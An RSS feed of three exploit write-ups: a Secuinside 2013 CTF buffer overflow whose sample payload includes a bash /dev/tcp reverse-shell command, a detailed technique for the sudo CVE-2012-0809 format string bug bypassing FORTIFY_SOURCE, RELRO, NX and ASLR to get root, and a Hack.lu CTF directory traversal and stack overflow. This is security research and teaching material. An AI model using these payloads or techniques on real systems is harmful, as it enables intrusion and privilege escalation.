<?xml version="1.0" encoding="UTF-8" ?>

<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
   
   	<title>RealJenius.com - Tag: rop</title>
   
   <link>http://realjenius.com</link>
   <description>I'm a software developer in the game industry, and have been (for better or worse) coding on the Java platform for the last decade. I also do all my own stunts.</description>
   <language>en-us</language>
   <managingEditor>R.J. Lorimer</managingEditor>
   <atom:link href="rss" rel="self" type="application/rss+xml" />
   
	<item>
  <title>[Secuinside CTF 2013] pwnme writeup</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2013/05/28/secuinside-ctf-2013-pwnme-writeup.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2013-05-28T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2013/05/28/secuinside-ctf-2013-pwnme-writeup.html</guid>
  <description><![CDATA[
     <p>Challenge summary:</p>

<p>Binary : http://war.secuinside.com/files/pwnme<br />
Source : http://war.secuinside.com/files/pwnme.c<br />
===================================<br />
OS : Ubuntu 13.04 with PIE+ASLR+NX<br />
md5 of libc-2.17.so : 45be45152ad28841ddabc5c875f8e6e4</p>

<p>IP : 54.214.248.68<br />
PORT : 8181,8282,8383</p>

<p>This is the only exploit challenge comes with source. The bug is simple: buffer overflow with only 16-bytes at <em>pwnme.c:67</em>, just enough to control EIP. The goal is to bypass PIE+ASLR+NX. We first thought about information leak by overwriting one byte of saved EIP and looking for status. Unfortunately, this way soon becomes an dead end as socket was closed before returning at <em>pwnme.c:72</em>, so no more input, output can be provided to the program. Conclusion: we have to bruteforce for useful addresses, and due to binary is PIE bruteforcing for libc address the best way for code reuse. Luckily, ASLR on Ubuntu x86 is weak, the libc base address looks like 0xb7NNN000 with only 12-bits randomization. Server daemon will fork a child process for every coming connection, that means addresses will be the same for all instances and bruteforcing 12-bits only take 4096 tries at max. If server is fast, stable this can be done in few minutes, but in fact CTF game server was out of service for most of the time :).</p>

<p>Now we can assume that libc is at fixed address, let build the payload. But where is my input buffer? It was zeroing out at <em>pwnme.c:71</em>, there must be something hidden. Let take a look at crash by sending a 1040 bytes pattern buffer:</p>

<pre class="brush: plain; title: ; notranslate" title="">Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0xb774b000 --&gt; 0x1aed9c
ECX: 0x0
EDX: 0xb774b000 --&gt; 0x1aed9c
ESI: 0x0
EDI: 0x0
EBP: 0x41397441 ('At9A')
ESP: 0xbfac6ce0 --&gt; 0x1
EIP: 0x75417375 ('usAu')
EFLAGS: 0x10217 (CARRY PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x75417375
[------------------------------------stack-------------------------------------]
0000| 0xbfac6ce0 --&gt; 0x1
0004| 0xbfac6ce4 --&gt; 0xbfac6d74 --&gt; 0xbfac78db ("./pwnme")
0008| 0xbfac6ce8 --&gt; 0xbfac6d7c --&gt; 0xbfac78e3 ("TERM=xterm")
0012| 0xbfac6cec --&gt; 0xb777a000 --&gt; 0x20f38
0016| 0xbfac6cf0 --&gt; 0x20 (' ')
0020| 0xbfac6cf4 --&gt; 0x0
0024| 0xbfac6cf8 --&gt; 0xb77566f0 --&gt; 0xb759c000 --&gt; 0x464c457f
0028| 0xbfac6cfc --&gt; 0x3
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x75417375 in ?? ()
gdb-peda$ patts
Registers contain pattern buffer:
EIP+0 found at offset: 1036
EBP+0 found at offset: 1032
No register points to pattern buffer
Pattern buffer found at:
0xb7753000 : offset 1016 - size   24 (mapped)
0xb7753023 : offset   27 - size  989 (mapped)
0xbfac6cd0 : offset 1024 - size   16 ($sp + -0x10 [-4 dwords])
References to pattern buffer found at:
0xb774ba24 : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
0xb774ba28 : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
0xb774ba2c : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
0xb774ba30 : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
0xb774ba34 : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
0xb774ba38 : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
0xb774ba3c : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
0xbfac6210 : 0xb7753000 ($sp + -0xad0 [-692 dwords])
0xbfac6224 : 0xb7753000 ($sp + -0xabc [-687 dwords])
0xbfac6248 : 0xb7753000 ($sp + -0xa98 [-678 dwords])
0xbfac6254 : 0xb7753000 ($sp + -0xa8c [-675 dwords])
0xbfac6294 : 0xb7753000 ($sp + -0xa4c [-659 dwords])
0xbfac67c8 : 0xb7753000 ($sp + -0x518 [-326 dwords])
0xbfac67d4 : 0xb7753000 ($sp + -0x50c [-323 dwords])
0xbfac6814 : 0xb7753000 ($sp + -0x4cc [-307 dwords])
gdb-peda$
</pre>

<p>Our input buffer is still there in non-stack memory starts at 0xb7753000, actually this is “stdout” buffer used in <em>printf()</em> at <em>pwnme.c:70</em>.</p>

<pre class="brush: plain; title: ; notranslate" title="">gdb-peda$ info symbol 0xb7753000
No symbol matches 0xb7753000.
gdb-peda$ info symbol 0xb774ba24
_IO_2_1_stdout_ + 4 in section .data of /lib/i386-linux-gnu/tls/i686/nosegneg/libc.so.6
</pre>

<p>We can only assume that libc is fixed, if above buffer address is randomized things will become worse (means finding tedious ROP gadgets to pivot). Fortunately, that buffer is at fixed offset related to libc address.</p>

<pre class="brush: plain; title: ; notranslate" title="">gdb-peda$ vmmap libc
Start      End        Perm    Name
0xb759c000 0xb7749000 r-xp    /lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so
0xb7749000 0xb774b000 r--p    /lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so
0xb774b000 0xb774c000 rw-p    /lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so
gdb-peda$ distance 0xb759c000 0xb7753000
From 0xb759c000 to 0xb7753000: 1798144 bytes, 449536 dwords
</pre>

<p>Try to run the program several times to check and the offset is unchanged. We can build the payload now, the simplest one is calling <em>system()</em> with bash reverse shell, or you can try harder with full ROP payload (like what we did during the contest and wasted few more hours :)).</p>

<p>Sample payload will look like:</p>

<pre class="brush: plain; title: ; notranslate" title="">base = 0xb7500000 + bruteforce_value
target = base + 1798144 + 0x304 # make enough space for fake stack
cmd_ptr = target + some_offset # calculate it yourself
cmd = "bash -c 'exec &gt;/dev/tcp/127.127.127.127/4444 0&lt;&amp;1';"
payload = [ret ... ret, system, exit, cmd_ptr, cmd, padding] # total size = 1032
payload += [target] # will become EBP
payload += [leave_ret] # stack pivoting
</pre>

<p>Run it hundred of times and wait for a shell coming to your box.</p>

  ]]></description>
</item>

	<item>
  <title>Exploiting Sudo format string vunerability</title>
  <link>http://realjenius.com/research/2012/02/16/exploiting-sudo-format-string-vunerability.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2012-02-16T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/research/2012/02/16/exploiting-sudo-format-string-vunerability.html</guid>
  <description><![CDATA[
     <p>In this post we will show how to exploit format string vulnerability in sudo 1.8 that reliably bypasses FORTIFY_SOURCE, ASLR, NX and Full RELRO protections. Our test environment is Fedora 16 which is shipped with a vulnerable sudo version (sudo-1.8.2p1).</p>

<h2 id="the-vulnerability">The vulnerability</h2>

<p>Vulnerability detail can be found in <a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-0809" target="_blank">CVE-2012-0809</a>. In summary, executing sudo in debug mode with crafted argv[0] will trigger the format string bug. E.g:</p>

<pre>$ ln -s /usr/bin/sudo ./%n
$ ./%n -D9</pre>

<h2 id="the-exploit">The exploit</h2>

<p>Though above format string vulnerability is straight, it is not easy to exploit on modern Linux distributions. sudo binary in Fedora 16 comes with:</p>

<ul>
  <li><a href="http://fedoraproject.org/wiki/Security/Features#Compile_Time_Buffer_Checks_.28FORTIFY_SOURCE.29" target="_blank">FORTIFY_SOURCE</a></li>
  <li>Full <a href="http://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank">ASLR</a> (including <a href="http://en.wikipedia.org/wiki/Position-independent_code#Position-independent_executables">PIE</a>)</li>
  <li>Full <a href="http://isisblogs.poly.edu/2011/06/01/relro-relocation-read-only/" target="_blank">RELRO</a></li>
  <li><a href="http://en.wikipedia.org/wiki/Executable_space_protection" target="_blank">NX</a> (DEP)</li>
</ul>

<p>In order to exploit format string bug we have to bypass all above protections, but thanks to this local bug, we can disable ASLR easily with resources limit trick (another notes, prelink is enabled on Fedora 16 so it also disable ASLR from local exploits). As a consequence, NX can be defeated with return-to-libc/ROP with known addresses. The most difficult part is bypassing FORTIFY_SOURCE.</p>

<h3 id="bypassing-fortifysource">Bypassing FORTIFY_SOURCE</h3>

<p>We just follow <a href="http://www.phrack.org/issues.html?issue=67&amp;id=9&amp;mode=txt" target="_blank">“A Eulogy for Format Strings”</a> article from Phrack #67 by Captain Planet wit very detail steps to bypass FORTIFY_SOURCE. In summary, there is an integer overflow bug in FORTIFY_SOURCE patch, by exploiting this we can turn off <span style="line-height: normal">_IO_FLAGS2_FORTIFY bit in file stream and use “%n” operation from a writable address. Following steps will be done:</span><span style="line-height: normal"> </span></p>

<ol>
  <li>Set nargs to a big value so (nargs * 4) will be truncated to a small integer value, the perfect value is nargs = 0×40000000, so nargs * 4 = 0. The format string to achieve this looks like: “%*1073741824$”</li>
  <li><span style="line-height: normal">Turn off </span>_IO_FLAGS2_FORTIFY on stderr file stream</li>
  <li>Reset nargs = 0 to bypass check loop</li>
</ol>

<p>Let examine #2 and #3 in detail. We create a wrapper (sudo-exploit.py) then fire a GDB session:</p>

<pre class="brush: python; title: ; notranslate" title="">#!/usr/bin/env python
import os
import sys

def exploit(vuln):
    fmtstring = "%*123$ %*456$ %1073741824$"
    args = [fmtstring, "-D9"]
    env = os.environ
    os.execve(vuln, args, env)

if __name__ == "__main__":
    if len(sys.argv) &lt; 2:
        usage()
    else:
        exploit(sys.argv[1])
</pre>

<pre class="brush: plain; title: ; notranslate" title=""># ulimit -s unlimited
# gdb -q /usr/bin/sudo
Reading symbols from /usr/bin/sudo...Reading symbols from /usr/lib/debug/usr/bin/sudo.debug...done.
done.
gdb$ set exec-wrapper ./sudo-exploit.py
gdb$ run
process 2149 is executing new program: /usr/bin/sudo
*** invalid %N$ use detected ***

Program received signal SIGABRT, Aborted.
gdb$ bt
#0  0x40038416 in ?? ()
#1  0x400bc98f in __GI_raise (sig=0x6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:64
#2  0x400be2d5 in __GI_abort () at abort.c:91
#3  0x400fbe3a in __libc_message (do_abort=0x1, fmt=0x401f3dea "%s") at ../sysdeps/unix/sysv/linux/libc_fatal.c:198
#4  0x400fbf64 in __GI___libc_fatal (message=0x401f5a6c "*** invalid %N$ use detected ***n") at ../sysdeps/unix/sysv/linux/libc_fatal.c:209
#5  0x400d1df5 in _IO_vfprintf_internal (s=0xbff42498, format=&lt;optimized out&gt;, ap=0xbff42b78  &lt;incomplete sequence 340&gt;) at vfprintf.c:1771
#6  0x400d566b in buffered_vfprintf (s=0x40234920, format=&lt;optimized out&gt;, args=&lt;optimized out&gt;) at vfprintf.c:2207
#7  0x400d0cad in _IO_vfprintf_internal (s=0x40234920, format=0x4023b958 "%*123$ %*456$ %1073741824$: settings: %s=%sn", ap=0xbff42b78  &lt;incomplete sequence 340&gt;) at vfprintf.c:1256
#8  0x401958a1 in ___vfprintf_chk (fp=0x40234920, flag=0x1, format=0x4023b958 "%*123$ %*456$ %1073741824$: settings: %s=%sn", ap=0xbff42b78  &lt;incomplete sequence 340&gt;) at vfprintf_chk.c:35
#9  0x400094a0 in vfprintf (__ap=0xbff42b78  &lt;incomplete sequence 340&gt;, __fmt=&lt;optimized out&gt;, __stream=&lt;optimized out&gt;) at /usr/include/bits/stdio2.h:128
#10 sudo_debug (level=0x9, fmt=0x4000dff3 "settings: %s=%s") at ./sudo.c:1202
#11 0x400082cd in parse_args (argc=0x1, argv=0x4023b730, nargc=0xbff42d20, nargv=0xbff42d24, settingsp=0xbff42d28, env_addp=0xbff42d2c) at ./parse_args.c:413
#12 0x40002890 in main (argc=0x2, argv=0xbff42df4, envp=0xbff42e00) at ./sudo.c:203

gdb$ list vfprintf.c:1688
1683	    /* Fill in the types of all the arguments.  */
1684	    for (cnt = 0; cnt &lt; nspecs; ++cnt)
1685	      {
1686		/* If the width is determined by an argument this is an int.  */
1687		if (specs[cnt].width_arg != -1)
1688		  args_type[specs[cnt].width_arg] = PA_INT;
1689
1690		/* If the precision is determined by an argument this is an int.  */
1691		if (specs[cnt].prec_arg != -1)
1692		  args_type[specs[cnt].prec_arg] = PA_INT;
gdb$ break vfprintf.c:1688
Breakpoint 1 at 0x400d1c5b: file vfprintf.c, line 1688.

gdb$ run
process 2157 is executing new program: /usr/bin/sudo
   0x400d1c53 &lt;_IO_vfprintf_internal+4531&gt;:	mov    eax,DWORD PTR [edi+0x20]
   0x400d1c56 &lt;_IO_vfprintf_internal+4534&gt;:	cmp    eax,0xffffffff
   0x400d1c59 &lt;_IO_vfprintf_internal+4537&gt;:	je     0x400d1c68 &lt;_IO_vfprintf_internal+4552&gt;
=&gt; 0x400d1c5b &lt;_IO_vfprintf_internal+4539&gt;:	mov    edx,DWORD PTR [ebp-0x484]
   0x400d1c61 &lt;_IO_vfprintf_internal+4545&gt;:	mov    DWORD PTR [edx+eax*4],0x0
   0x400d1c68 &lt;_IO_vfprintf_internal+4552&gt;:	mov    eax,DWORD PTR [edi+0x1c]
   0x400d1c6b &lt;_IO_vfprintf_internal+4555&gt;:	cmp    eax,0xffffffff
   0x400d1c6e &lt;_IO_vfprintf_internal+4558&gt;:	je     0x400d1c7d &lt;_IO_vfprintf_internal+4573&gt;

Breakpoint 1, _IO_vfprintf_internal (s=0xbfe48748, format=&lt;optimized out&gt;, ap=0xbfe48e28  &lt;incomplete sequence 340&gt;) at vfprintf.c:1688
1688		  args_type[specs[cnt].width_arg] = PA_INT;

gdb$ p &amp;s-&gt;_flags2
$1 = (_IO_FILE **) 0xbf845310
gdb$ p/d (char*)&amp;s-&gt;_flags2 - *(int)($ebp-0x484)
$2 = 11396

gdb$ p &amp;nargs
$3 = (size_t *) 0xbf844e74
gdb$ p/d (char*)&amp;nargs - *(int)($ebp-0x484)
$4 = 1924
</pre>

<p><em>s-&gt;_flags2</em> and <em>nargs</em> is on stack with fixed relative offsets to current stack pointer, so we can adjust offsets according to relative stack addresses to fulfill #2 &amp; #3. Let do this again and calculate correct values when we have final format string for the exploit.</p>

<h3 id="bypassing-full-relro">Bypassing Full RELRO</h3>

<p>We can now use “%n” primitive to write anywhere with any value, but where to write to? sudo binary is compiled with Full RELRO, this means we cannot write to GOT entry or dynamic-&gt;.fini to redirect the execution as they are read-only. The idea here is simple: we try to overwrite function pointer in libc or ld-linux and hope it will be called later in program to trigger redirection. This works smoothly with sudo case.</p>

<pre class="brush: plain; title: ; notranslate" title=""># ln -s /usr/bin/sudo ./%x
# ulimit -s unlimited
# gdb -q ./%x
gdb$ list sudo.c:204
199	    memset(&amp;user_details, 0, sizeof(user_details));
200	    user_info = get_user_info(&amp;user_details);
201
202	    /* Parse command line arguments. */
203	    sudo_mode = parse_args(argc, argv, &amp;nargc, &amp;nargv, &amp;settings, &amp;env_add);
204	    sudo_debug(9, "sudo_mode %d", sudo_mode);
205
206	    /* Print sudo version early, in case of plugin init failure. */
207	    if (ISSET(sudo_mode, MODE_VERSION)) {
208		printf("Sudo version %sn", PACKAGE_VERSION);

gdb$ break sudo.c:207
gdb$ run -D9
4000e036: settings: 9=en_US.UTF-8
4000e0bc: settings: %x=en_US.UTF-8
4000e0c5: settings: true=en_US.UTF-8
4000e0fc: settings: 10.0.2.15/255.255.255.0 fe80::a00:27ff:fe9e:e68c/ffff:ffff:ffff:ffff::=en_US.UTF-8
a0001: sudo_mode -1078177084
Breakpoint 1, main (argc=0x2, argv=0xbfbc5394, envp=0xbfbc53a0) at ./sudo.c:207
207	    if (ISSET(sudo_mode, MODE_VERSION)) {

gdb$ vmmap libc
Start	End	Perm	Name
0x400a8000 0x4024d000 r-xp /lib/libc-2.14.90.so
0x4024d000 0x4024f000 r--p /lib/libc-2.14.90.so
0x4024f000 0x40250000 rw-p /lib/libc-2.14.90.so
gdb$ x/8wx 0x4024f000
0x4024f000:	0x401da990	0x40122490	0x40121e10	0x401227a0
0x4024f010:	0x4013fc60	0x40122fb0	0x40027f20	0x401223e0
gdb$ x/8i 0x40121e10
0x40121e10 &lt;__GI___libc_malloc&gt;:	sub    esp,0x3c
0x40121e13 &lt;__GI___libc_malloc+3&gt;:	mov    DWORD PTR [esp+0x2c],ebx
0x40121e17 &lt;__GI___libc_malloc+7&gt;:	call   0x401db813 &lt;__i686.get_pc_thunk.bx&gt;
0x40121e1c &lt;__GI___libc_malloc+12&gt;:	add    ebx,0x12d1d8
0x40121e22 &lt;__GI___libc_malloc+18&gt;:	mov    DWORD PTR [esp+0x30],esi
0x40121e26 &lt;__GI___libc_malloc+22&gt;:	mov    esi,DWORD PTR [esp+0x40]
0x40121e2a &lt;__GI___libc_malloc+26&gt;:	mov    DWORD PTR [esp+0x34],edi
0x40121e2e &lt;__GI___libc_malloc+30&gt;:	mov    DWORD PTR [esp+0x38],ebp

gdb$ set *0x4024f008=0x41414141
gdb$ continue
Program received signal SIGSEGV, Segmentation fault.
0x400bee20 &lt;realloc@plt+0&gt;:	jmp    DWORD PTR [ebx+0x10]
0x400bee26 &lt;realloc@plt+6&gt;:	push   0x8
0x400bee2b &lt;realloc@plt+11&gt;:	jmp    0x400bee00
=&gt; 0x400bee30 &lt;malloc@plt+0&gt;:	jmp    DWORD PTR [ebx+0x14]
0x400bee36 &lt;malloc@plt+6&gt;:	push   0x10
0x400bee3b &lt;malloc@plt+11&gt;:	jmp    0x400bee00
0x400bee40 &lt;memalign@plt+0&gt;:	jmp    DWORD PTR [ebx+0x18]
0x400bee46 &lt;memalign@plt+6&gt;:	push   0x18
0x400bee30 in malloc@plt () from /lib/libc.so.6
gdb$ x/x $ebx+0x14
0x4024f008:	0x41414141
</pre>

<h3 id="bypassing-nx">Bypassing NX</h3>

<p>The last part of our exploit is bypassing NX and this can be done via libc ROP gadgets as its address now is fixed. We spray the environment with target payload and use a stack pivot gadget <em>(add esp, 0xNNN)</em> to jump to it. Out payload will look like:</p>

<pre>[ ROP NOPs | setuid, execve, 0, &amp;/bin/sh, nullptr, nullptr ]</pre>

<p>Or we can use another simple version to avoid NULL byte:</p>

<pre>[ ROP NOPs | execve, exit, &amp;./custom_shell, nullptr, nullptr ]</pre>

<p>Where <em>“./custom_shell”</em> is an available string in libc (e.g: “./0123456789:;&lt;=&gt;?”)</p>

<h3 id="exploit-code">Exploit code</h3>

<p>To not spoil the fun of people who may want to try it, I will post it later <img src="http://vnsec-new.cloudapp.net/wp/wp-includes/images/smilies/icon_smile.gif" alt=":)" class="wp-smiley" /> </p>

<h2 id="further-notes">Further notes</h2>

<h3 id="fortifysource-on-x86x64">FORTIFY_SOURCE on x86_x64</h3>

<p>The technique we use here to bypass FORTIFY_SOURCE failed work on x86_64 as we can not find a *nargs *value (32-bit) that satisfies: (nargs * 4) is truncated to a small 64-bit value. I hope someone will find new ways to bypass it on x86_64.</p>

<h3 id="reliability-of-exploit">Reliability of exploit</h3>

<p>Though we disable ASLR, stack address is not affected and sometimes there is a gap between current stack pointer and our payload in environment and we may fail to perform stack pivoting. In order to achieve reliability, we have to spray the environment carefully. <em>Update: 65K environment is enough for 100% reliability on Fedora (thanks to brainsmoke)</em></p>

<h2 id="span-stylecolor-ff0000updatespan-exploit-on-grsecuritypax-enabled-kernel"><span style="color: #ff0000">Update:</span> exploit on grsecurity/PaX-enabled kernel</h2>

<p>Our exploit on Fedora16 with vanilla kernel relies on a single address: libc base address. With PaX’s ASLR implementation we have to bruteforce for 20-bits and this is definitely hard with proper ASLR. Though “ulimit -s unlimited” has no real effect on grsecurity/PaX-enabled kernel, it can help to reduce 4-bits entropy of library addresses. 16-bits bruteforcing still requires average 32K+ runs and is hopeless with grsecurity’s bruteforce deterring (15 minutes locked out of system for a failed try).</p>

<p>We had to re-work to make our exploit has a chance to win ASLR. Obviously, we cannot pick any address of library or binary to overwrite, the only way now is to overwrite available addresses on stack. *Fortunately*, we can overwrite saved EIP of sudo_debug() directly as there is pointers to it on stack. Following GDB session shows that:</p>

<pre class="brush: plain; title: ; notranslate" title="">gdb$ backtrace
#0  sudo_debug (level=0x9, fmt=0xb772c013 "settings: %s=%s") at ./sudo.c:1192
#1  0xb77262ed in parse_args (argc=0x1, argv=0xb7734dc8, nargc=0xbfffe720, nargv=0xbfffe724, settingsp=0xbfffe728, env_addp=0xbfffe72c) at ./parse_args.c:413
#2  0xb77208b0 in main (argc=0x2, argv=0xbfffe7f4, envp=0xbfffe800) at ./sudo.c:203
gdb$ pref 0xb77262ed
Found 5 results:
0xbfffe030 --&gt; 0xbfffe56c --&gt; 0xb77262ed (0xb77262ed &lt;parse_args+1837&gt;:	mov    eax,DWORD PTR [esp+0x2c])
0xbfffe060 --&gt; 0xbfffe56c --&gt; 0xb77262ed (0xb77262ed &lt;parse_args+1837&gt;:	mov    eax,DWORD PTR [esp+0x2c])
0xbfffe0c0 --&gt; 0xbfffe56c --&gt; 0xb77262ed (0xb77262ed &lt;parse_args+1837&gt;:	mov    eax,DWORD PTR [esp+0x2c])
0xbfffe0f0 --&gt; 0xbfffe56c --&gt; 0xb77262ed (0xb77262ed &lt;parse_args+1837&gt;:	mov    eax,DWORD PTR [esp+0x2c])
0xbfffe2a0 --&gt; 0xbfffe56c --&gt; 0xb77262ed (0xb77262ed &lt;parse_args+1837&gt;:	mov    eax,DWORD PTR [esp+0x2c])
</pre>

<p>By chosing to return to near by function inside sudo binary (e.g my_execve()), we can effectively reduce the entropy down to 4-bits with a short write (%hn):</p>

<pre class="brush: plain; title: ; notranslate" title="">gdb$ run
gdb$ p my_execve
$1 = {int (const char *, char * const *, char * const *)} 0xb7721fe0 &lt;my_execve&gt;

gdb$ run
gdb$ p my_execve
$2 = {int (const char *, char * const *, char * const *)} 0xb7726fe0 &lt;my_execve&gt;
</pre>

<p>This is a quite good improvement, even on PaX-enabled kernel we only need few tries to get a root shell. But with grsecurity’s bruteforce deterring, I don’t know how long it will take (maybe days) as I failed to get a shell after a day. Though we have a good exploit against real ASLR, it is still far from ideal “one-shot exploit”. One-shot exploit can only be done if we are able to leak the library/binary address then (ab)use it on the fly.</p>

<p>In TODO part of Phrack 67 article, the author mentioned that he could not stabilize the use of copy (read+write) primitive when abusing printf(). I decided to reproduce his experiment under a new condition: stack limit is lifted with “ulimit -s unlimited”. After hundred of tries for different offsets, we can stabilize the copy, which means we successfully leak the address and abuse it on the fly. Hunting for address on stack is easy now, we can choose to pick saved EIP of sudo_debug itself or any address of libc available on stack (e.g from __vfprintf_internal function). Then we calculate the offset from there to an exec() function, copy (read+write) it to overwrite saved EIP of sudo_debug() with a format string looks like “%*123$x %456x %789$n”. By repeating the write step, we are able to create custom arguments on stack to prepare for a valid execution via exec() and achieve a one-shot pwn.</p>

<h3 id="notes">Notes</h3>

<ul>
  <li>We rarely find pointer to save EIP of functions on stack for direct overwrite like this case</li>
  <li>Direct parameter access is 12-bytes each unlike 4-bytes each in normal format string exploit. This will limit your ability to write to arbitrary pointer on stack.</li>
  <li>Copy primitive uses unsigned value, so if library/binary base is mapped at high address (e.g 0xb7NNNNNN) we will fail to leak the address on the fly (it is still an open problem, hope someone can find out). With PaX’s ASLR, we are in luck as it maps library/binary start at something like 0x2NNNNNNN in the effect of “ulimit -s unlimited” (so it actually has effect :)).</li>
</ul>


  ]]></description>
</item>

	<item>
  <title>Hack.lu CTF 2011: Nebula Death Stick Services writeup</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2011/10/03/hack-lu-ctf-2011-nebula-death-stick-services-writeup.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2011-10-03T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2011/10/03/hack-lu-ctf-2011-nebula-death-stick-services-writeup.html</guid>
  <description><![CDATA[
     <h2 id="challenge-information">Challenge Information</h2>

<blockquote>
  <p>Death Sticks are a totally illegal drug in the universe.<br />
However, somehow a company called Death Stick Services has managed to get a huge trade volume by selling Death Sticks directly and anonymously to their costumers.<br />
Seems like nobody has the power to stop them, so the Galactic’s Secret Service ordered YOU and your Special Forces team to get a Shell on Death Stick Service’s server and search for any evidence on how to take them down!<br />
May the force be with you.</p>

  <p>http://ctf.hack.lu:2010/</p>
</blockquote>

<h2 id="analysis">Analysis</h2>

<p><em>Thanks rd for helping Analysis part.</em></p>

<p>Checking around http://ctf.hack.lu:2010/ page, I found that there is a directory traversal vulnerability (<em>http://ctf.hack.lu:2010/?page=../../../../etc/resolv.conf</em>). Together with “<em>./a.out</em>” from HTTP response header, I managed to download the binary via this request <em>http://ctf.hack.lu:2010/?page=../a.out</em>.</p>

<p>“<em>a.out</em>” binary is a 32 bit x86 Linux binary, running on Ubuntu 10.10 server. There is a vulnerability in query parsing function parse_params as below.</p>

<p><a href="/wp/storage/uploads/2011/10/parse_params.jpg"><img class="aligncenter size-full wp-image-1236" title="parse_params" src="/wp/storage/uploads/2011/10/parse_params.jpg" alt="parse_params" width="372" height="407" /></a></p>

<p><strong>parse_params()</strong> function basically looks ‘<em>?</em>‘ and ‘<em>=</em>‘ in order to parse the input query such as <em>/?page=blah</em>, and then uses the different in length (<strong>len</strong>) to store parameter name and its value to the buffer on the stack of the caller function (<strong>handle_connection()</strong>). From above code, you can see that if we input in reverse order of ‘<em>?</em>‘ and ‘<em>=</em>‘ such as* /=blah?*, <strong>len</strong> value will be negative but it still pass the the condition check because of signed comparison. This leads into a traditional stack buffer overflow.</p>

<blockquote>
  <p>$ python2 -c ‘print “GET /=” + “A”*60 + “? HTTP/”‘|nc -v localhost 2010<br />
..<br />
(gdb) run<br />
Starting program: /home/jail/ctf/hack.lu/o500/a.out<br />
Notice: Nebulaserv – A Webserver for Nebulacorp</p>

  <p>Notice: Starting up!</p>

  <ul>
    <li>Accepting requests on port 2010<br />
[New process 4626]  </li>
    <li>
      <p>Got request with length 0: 127.0.0.1:35695 – GET /=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA? HTTP/</p>
    </li>
    <li>Got param: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt; with value  </li>
    <li>Opening ./nebula/index – 404 Not Found</li>
  </ul>

  <p>Program received signal SIGSEGV, Segmentation fault.<br />
[Switching to process 4626]<br />
0×41414141 in ?? ()</p>
</blockquote>

<h2 id="exploit">Exploit</h2>

<p>The binary has NX and ASLR enabled so we have to leak libc info from server for ROP/ret2libc exploit. During the game, to save time we utilized shell on the same server from Nebula DB challenge to retrieved libc, then constructed a ROP payload to call a custom shell script as <em>system(“/tmp/sh”)</em>. After the game, we investigate more to see if we can exploit without any knowledge of server. And here is the way we do:</p>

<h3 id="retrieve-libc">Retrieve libc</h3>

<p>In **handle_connection() **function socket fd is increased for every new connection. Though we can find this value on stack, it is still difficult to find code chunks to write back something valuable to our socket. Instead, we can utilize the directory traversal bug above to retrieve libc via this request: <span style="font-style: italic">http://ctf.hack.lu:2010/?page=../../../../lib/libc.so.6</span></p>

<h3 id="construct-rop-payload">Construct ROP payload</h3>

<p>With libc in hand, we know exact offset to any libc function and ROP payload can be constructed using “<a href="http://www.vnsecurity.net/2010/08/ropeme-rop-exploit-made-easy/" target="_self">data re-use way</a>” via <em>sprintf() – *which can perform byte-per-byte transfer the same as *strcpy() – *or “<a href="http://auntitled.blogspot.com/2011/09/rop-with-common-functions-in.html" target="_blank">ROP with common functions in Ubuntu/Debian x86</a>“</em>. *</p>

<h3 id="the-flag">The flag</h3>

<p>The flag was put in a file with strange name so you cannot guess and get it via directory traversal bug.</p>

<pre class="brush: plain; title: ; notranslate" title="">$ ls -l /home/nebulaserver

total 24

-r-xr-x--- 1 root nebulaserver 11195 2011-09-11 20:50 a.out

-r--r----- 1 root nebulaserver    27 2011-09-20 13:19 IguessTHISisTHEflagDOOD

drwxr-xr-x 3 root nebulaserver  4096 2011-09-11 20:22 nebula

-r-xr-x--- 1 root nebulaserver    82 2011-09-20 17:00 restart.sh

$ cat /home/nebulaserver/IguessTHISisTHEflagDOOD

Flag: R0PPINGy0urWAYinDUDE

</pre>

<div id="_mcePaste" style="width: 1px;height: 1px">
  $ ls -l /home/nebulaserver
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  total 24
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  -r-xr-x&#8212; 1 root nebulaserver 11195 2011-09-11 20:50 a.out
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  -r&#8211;r&#8212;&#8211; 1 root nebulaserver    27 2011-09-20 13:19 IguessTHISisTHEflagDOOD
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  drwxr-xr-x 3 root nebulaserver  4096 2011-09-11 20:22 nebula
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  -r-xr-x&#8212; 1 root nebulaserver    82 2011-09-20 17:00 restart.sh
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  $ cat /home/nebulaserver/IguessTHISisTHEflagDOOD
